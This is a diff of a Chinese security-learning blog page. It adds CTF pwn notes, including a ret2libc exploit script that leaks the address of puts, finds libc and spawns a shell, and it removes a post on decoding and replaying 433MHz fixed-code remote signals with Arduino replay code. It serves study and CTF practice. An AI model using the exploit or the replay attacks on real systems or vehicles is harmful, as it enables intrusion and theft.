+<p><img src="http://ww1.sinaimg.cn/large/0063hjnqly1g8uamvho6aj30k607q0ua.jpg" alt="1.jpg"></p>
+<p>通过puts函数打印一下puts函数在got表中的位置，这个位置也就是puts函数的地址。然后通过泄露的puts函数的地址的后三位(0xf7d9aca0)ca0来确定libc的版本。确定方法有很多可以用libcdatabase去查，或者是一个python的插件LibcSearcher去查询。</p>
+<p>然后通过puts的地址减去泄露的libc中的puts函数的偏移，去获得libc_base基地址。通过libc_base+libc中需要用到的函数或者字符串的偏移去算得个函数的具体地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">puts_addr = u32(p.recv(4))</span><br><span class="line">libc = LibcSearcher(&apos;puts&apos;,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&apos;puts&apos;)</span><br><span class="line">system_addr = libc_base + libc.dump(&apos;system&apos;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&apos;str_bin_sh&apos;)</span><br><span class="line">#用的python插件或者libc中的偏移，github自行下载</span><br></pre></td></tr></table></figure>
+<p>然后就可以通过调用获得shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">main_addr = 0x8048618</span><br><span class="line">proc = &apos;./ret2libc3&apos;</span><br><span class="line">elf = ELF(proc)</span><br><span class="line">#libc = ELF(&apos;libc.so&apos;)</span><br><span class="line">p = process(proc)</span><br><span class="line">if args.G:</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">p.sendlineafter(&apos;!?&apos;, &apos;a&apos; * 112 + p32(elf.plt[&apos;puts&apos;]) + p32(main_addr) + p32(elf.got[&apos;puts&apos;]))</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(4))</span><br><span class="line">#libc_base = puts_addr - libc.symbols[&apos;puts&apos;]</span><br><span class="line">#system_addr = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">#binsh_addr = libc_base + 0x15ba0b</span><br><span class="line">libc = LibcSearcher(&apos;puts&apos;,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&apos;puts&apos;)</span><br><span class="line">system_addr = libc_base + libc.dump(&apos;system&apos;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&apos;str_bin_sh&apos;)</span><br><span class="line"></span><br><span class="line">p.sendline(&apos;a&apos; * 104 + p32(system_addr) + p32(main_addr) + p32(binsh_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>后来为啥从112的偏移变成了104的话，我还不太会，gdb不咋会用有点尴尬</p>
+<h3 id="2-hello"><a href="#2-hello" class="headerlink" title="2.hello"></a>2.hello</h3><p>大概就是占满内存，然后就阻塞了，跳转到指定的函数地址。</p>
 <p>text一般是有权限的。</p>
-<p>p64与u64或者其他的都不太了解。。</p>
-<h2 id="Bugku"><a href="#Bugku" class="headerlink" title="Bugku"></a>Bugku</h2><h3 id="2-pwn2"><a href="#2-pwn2" class="headerlink" title="2.pwn2"></a>2.pwn2</h3><p>已经刷完了，大概思路已清楚</p>
-<p>就是先覆盖，完事儿执行</p>
+<h2 id="Bugku"><a href="#Bugku" class="headerlink" title="Bugku"></a>Bugku</h2><h3 id="2-pwn2"><a href="#2-pwn2" class="headerlink" title="2.pwn2"></a>2.pwn2</h3><p>先覆盖，再执行</p>
 <h3 id="3-pwn4"><a href="#3-pwn4" class="headerlink" title="3.pwn4"></a>3.pwn4</h3><p>常见的除了‘/bin/sh’还有’$0’也可以是shell的地址</p>
 <h2 id="极客大挑战2019"><a href="#极客大挑战2019" class="headerlink" title="极客大挑战2019"></a>极客大挑战2019</h2><h3 id="1-pwn2"><a href="#1-pwn2" class="headerlink" title="1.pwn2"></a>1.pwn2</h3><p>直接正常操作</p>
 <p>覆盖地址，然后跳转到get shell函数</p>
@@ -1709,180 +1944,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://devil0x.github.io/2019/06/20/固定码逆向分析/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="devil0x">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="devil0x菜鸟">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/06/20/固定码逆向分析/" itemprop="url">固定码逆向分析</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-20T03:26:52+08:00">
-                2019-06-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="固定码逆向分析"><a href="#固定码逆向分析" class="headerlink" title="固定码逆向分析"></a>固定码逆向分析</h1><p> 环境：kali</p>
-<h2 id="0x01-Analysis-信号分析"><a href="#0x01-Analysis-信号分析" class="headerlink" title="0x01. Analysis 信号分析"></a>0x01. <strong>Analysis 信号分析</strong></h2><p>分析信号可使用音频处理软件Audacity：</p>
-<p>不过这种方式需要肉眼将波形转化成0跟1，看起来比较容易眼花。so用软件辅助一下</p>
-<h2 id="1-1安装软件"><a href="#1-1安装软件" class="headerlink" title="1.1安装软件"></a>1.1<strong>安装软件</strong></h2><h3 id="1-inspectrum"><a href="#1-inspectrum" class="headerlink" title="1.inspectrum"></a>1.inspectrum</h3><p>在这篇文章中我们将通过inspectrum(<a href="https://github.com/miek/inspectrum" target="_blank" rel="noopener">https://github.com/miek/inspectrum</a>)这个工具来分析信号，配合Python将信号转成二进制数据。</p>
-<p>先安装所需的环境，再安装inspectrum。类似的软件还有DSpectrumGUI都行。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qt5-default libfftw3-dev cmake pkg-config libliquid-dev</span><br><span class="line">git clone https://github.com/miek/inspectrum.git </span><br><span class="line">mkdir build </span><br><span class="line">cd build </span><br><span class="line">cmake .. </span><br><span class="line">make </span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
-<h3 id="2-universal-radio-hacker-urh"><a href="#2-universal-radio-hacker-urh" class="headerlink" title="2. universal radio hacker(urh)"></a>2. universal radio hacker(urh)</h3><p>有windos版直接下载即可</p>
-<h3 id="3-HDSHR"><a href="#3-HDSHR" class="headerlink" title="3.HDSHR"></a>3.HDSHR</h3><p>下载之后需要加载一下rt sdr的驱动</p>
-<p>地址：<a href="https://github.com/devil0x/wireless-analyze/blob/master/%E8%BD%AF%E4%BB%B6/ExtIO_RTL2832.dll" target="_blank" rel="noopener">https://github.com/devil0x/wireless-analyze/blob/master/%E8%BD%AF%E4%BB%B6/ExtIO_RTL2832.dll</a></p>
-<p><img src="https://github.com/devil0x/picture/raw/master/1.19/2.png" alt></p>
-<p>即可开始监听特定频段。</p>
-<h2 id="0x02-分析文件"><a href="#0x02-分析文件" class="headerlink" title="0x02.分析文件"></a>0x02.分析文件</h2><p>文件地址：<a href="https://github.com/mobier/WirelessSample" target="_blank" rel="noopener">https://github.com/mobier/WirelessSample</a></p>
-<h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h3><p><img src="https://image.3001.net/images/20181211/1544496759_5c0f2677573f8.png!small" alt></p>
-<p>摘抄：信号脉冲的宽度跟电压，震荡电阻是有关系的。我们可以算出信号的震荡周期（a=两倍的时钟震荡周期）f=2100016/Rosc(kΩ) kHz 其中 Rosc 为振荡电阻。</p>
-<p>我们来看下这两种信号的区别，第一种信号吧 Bit1 相当于 12A 宽度的高电平脉冲加 4A 宽度低电平的脉冲重复一次，而BIt0正好相反是 4a 高在是 12a 的低重复一次。然后说下 BitF，BitF 只会出现在地址位里面，代表该地址位引脚悬空，后面会提到，无效码则不可能出现在 2262 这种协议中，如果出现了只能表示这个信号是 2240 的。</p>
-<p>现在来说下第二种信号格式，第二种与第一种不同，非常明显能看出来第一种是把一段信号重复了两次来表示BIT1 和 BIT0，并且有三种表示方式。第二种呢就是 12A 宽度的高电平脉冲信号加上 4A 的低电平宽度脉冲信号就是 BIT1，相反的就是 BIT0，并且不像第一种那样数据有 3 种表示方式。</p>
-<h3 id="2-PT226X"><a href="#2-PT226X" class="headerlink" title="2.PT226X"></a>2.PT226X</h3><p><img src="https://image.3001.net/images/20181211/1544496739_5c0f2663762a9.png!small" alt></p>
-<p>首先来看一下PT226x的结构</p>
-<p>案例是录制的门铃的文件，433.92mhz，ASK调制。</p>
-<p><img src="C:\Users\skywa\Pictures\1.19\3.png" alt></p>
-<p>录制的文件是raw格式，我用的win10的udr打开的该文件。</p>
-<p><img src="https://github.com/devil0x/picture/raw/master/1.19/4.png" alt></p>
-<p>选择ask解调。</p>
-<p>再放大即可</p>
-<p><img src="https://github.com/devil0x/picture/raw/master/1.19/6.png" alt></p>
-<p>前部是4bit同步码，后半部分根据结构看的话，先是地址码，再之后为数据码。</p>
-<p>图中红线圈起来的刚好是与开始的案例相同的即：FFF0FFFF，再后边的数据码是1111。比对方式见开头图片关于PT226x的部分</p>
-<p>当然用另一种方法，直接在选择这样配置即可看出每段的二进制数据。</p>
-<p>1是11101110</p>
-<p>0是10001000</p>
-<p>F是10001110</p>
-<p><img src="https://github.com/devil0x/picture/raw/master/1.19/13.png" alt></p>
-<h3 id="3-PT224X"><a href="#3-PT224X" class="headerlink" title="3.PT224X"></a>3.PT224X</h3><p><img src="https://image.3001.net/images/20181211/1544496739_5c0f266399bbe.png!small" alt></p>
-<p>首先依旧是PT224X的结构部分，同样是先同步码后地址码再数据位的结构。</p>
-<p>区别就是位数更长。还有一个区别2240和2262的方法，只要有F就肯定是226X。</p>
-<p>案例给了2个录制好的文件，一个niu2.cs8，另一个PT2242.cs8。直接拖进urh打开是混乱的，可以先用audacity选择导入原数据。</p>
-<p><img src="https://github.com/devil0x/picture/raw/master/1.19/8.png" alt></p>
-<p>其次再选中空白部分直接剪掉即可，在导出为wav文件，直接用urh打开就可以看到波形图，再ASK调制，下方有个Autodetect parameters按钮点击一下即可，然后即可看出转换出的二进制数据。当然也可以选择inspectrum进行，但是感觉用urh似乎跟简单一些。</p>
-<p><img src="https://github.com/devil0x/picture/raw/master/1.19/11.png" alt></p>
-<p>然后底下就可以看出了、</p>
-<p><img src="https://github.com/devil0x/picture/raw/master/1.19/12.png" alt></p>
-<p>首先是1以及后边一大串空白是同步码，再然后底下 即可看出了，但是要记得在每行的最后一位空一个1，这个是下一段同步码的开始点位。现在选中的地方就是地址码加数据码的数据，没一个二进制数据由4个数字组成，Bit1 相当于 12A 宽度的高电平脉冲加 4A 宽度低电平的脉冲重复一次，而BIt0正好相反是 4a 高在是 12a 的低重复一次。</p>
-<p>然后直接可以看出1000代表0,1110代表1.</p>
-<h2 id="0x02-自制设备"><a href="#0x02-自制设备" class="headerlink" title="0x02.自制设备"></a>0x02.自制设备</h2><p>在淘宝可以搜到很多的非法设备，such as ：a890，还有什么d10m啥的，一般在淘宝咸鱼都是这样婶儿的。。。</p>
-<p><img src="https://github.com/devil0x/picture/raw/master/1.19/15.png" alt></p>
-<p><img src="https://github.com/devil0x/picture/raw/master/1.19/14.png" alt></p>
-<p>一般通常都是用来破解某些东西，自制的话用arduino+cc1101即可。cc1101一般淘宝买的版本呢，中心频率都工作在433mhz，但是并不代表不可以在315工作，cc1101 有各种型号such as ：cc1101 rgpt 这种low power sub -1Ghz。</p>
-<h3 id="工的话有这么几种："><a href="#工的话有这么几种：" class="headerlink" title="工的话有这么几种："></a>工的话有这么几种：</h3><h4 id="1-嗅探攻击"><a href="#1-嗅探攻击" class="headerlink" title="1.嗅探攻击"></a>1.嗅探攻击</h4><h6 id="嗅探到遥控器发射的-信号，再重放出去。"><a href="#嗅探到遥控器发射的-信号，再重放出去。" class="headerlink" title="嗅探到遥控器发射的 信号，再重放出去。"></a>嗅探到遥控器发射的 信号，再重放出去。</h6><h4 id="2-嗅探地址码"><a href="#2-嗅探地址码" class="headerlink" title="2.嗅探地址码"></a>2.嗅探地址码</h4><h6 id="因为地址码确定之后，数据码一般来说只有4种可能：1000-0100-0010-0001。such-as：通过嗅探一串锁车代码就能知道其他开车功能了。"><a href="#因为地址码确定之后，数据码一般来说只有4种可能：1000-0100-0010-0001。such-as：通过嗅探一串锁车代码就能知道其他开车功能了。" class="headerlink" title="因为地址码确定之后，数据码一般来说只有4种可能：1000,0100,0010,0001。such as：通过嗅探一串锁车代码就能知道其他开车功能了。"></a>因为地址码确定之后，数据码一般来说只有4种可能：1000,0100,0010,0001。such as：通过嗅探一串锁车代码就能知道其他开车功能了。</h6><h4 id="3-嗅探攻击"><a href="#3-嗅探攻击" class="headerlink" title="3.嗅探攻击"></a>3.嗅探攻击</h4><h6 id="暴力破解去枚举地址码。"><a href="#暴力破解去枚举地址码。" class="headerlink" title="暴力破解去枚举地址码。"></a>暴力破解去枚举地址码。</h6><h4 id="cc1101-arduino我不会"><a href="#cc1101-arduino我不会" class="headerlink" title="cc1101+arduino我不会"></a>cc1101+arduino我不会</h4><h3 id="用的arduino-超再生模块，RCswitch-h库实现"><a href="#用的arduino-超再生模块，RCswitch-h库实现" class="headerlink" title="用的arduino+超再生模块，RCswitch.h库实现"></a>用的arduino+超再生模块，RCswitch.h库实现</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;RCSwitch.h&gt;</span><br><span class="line"></span><br><span class="line">RCSwitch mySwitch = RCSwitch();</span><br><span class="line"></span><br><span class="line">void setup() &#123;</span><br><span class="line">  Serial.begin(9600);</span><br><span class="line">  mySwitch.enableTransmit(9);    // 定义发送模块的数据传输针脚</span><br><span class="line">  mySwitch.setPulseLength(170);   // 定义脉冲长度，这个值具体看你使用的遥控器而定</span><br><span class="line">&#125;</span><br><span class="line">void loop() </span><br><span class="line">&#123;</span><br><span class="line">      mySwitch.send(&quot;101111010010110011001&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可以输出，but没有电动车去做实验。</p>
-<p>。。。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -1928,7 +1994,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-count">21</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
